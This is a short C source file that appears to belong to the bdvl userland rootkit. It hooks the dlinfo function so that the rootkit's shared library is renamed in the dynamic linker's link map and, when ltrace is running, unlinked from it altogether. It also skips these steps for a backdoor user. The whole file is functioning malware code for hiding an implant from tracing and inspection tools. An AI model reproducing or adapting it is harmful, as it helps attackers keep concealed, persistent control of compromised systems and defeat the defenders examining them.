#include "../../util/util.h"

static struct link_map *bdvl_linkmap;

void repair_linkmap(void)
{
    bdvl_linkmap->l_prev->l_next = bdvl_linkmap;
    bdvl_linkmap->l_next->l_prev = bdvl_linkmap;
}

int dlinfo(void *handle, int request, void *p)
{
    hook(CDLINFO);
    if(is_bdusr()) return (long)call(CDLINFO, handle, request, p);

    if(request == 2)
    {
        struct link_map *loop;
        (void)call(CDLINFO, handle, request, &loop);

        do {
            loop = loop->l_next;
            if(strcmp(loop->l_name, "\0"))
            {
                xor(bdvlso, BDVLSO);
                if(strstr(loop->l_name, bdvlso))
                {
                    bdvl_linkmap = loop;
                    xor(lname, LINKMAP_NAME);
                    loop->l_name = strdup(lname);
                    clean(lname);

                    if(xprocess(LTRACE_STR))
                    {
                        (void)atexit(repair_linkmap);
                        loop->l_prev->l_next = loop->l_next;
                        loop->l_next->l_prev = loop->l_prev;
                    }
                }
                clean(bdvlso);
            }
        }while(loop != NULL && loop->l_name != NULL && loop->l_next != NULL);
    }

    return (long)call(CDLINFO, handle, request, p);
}
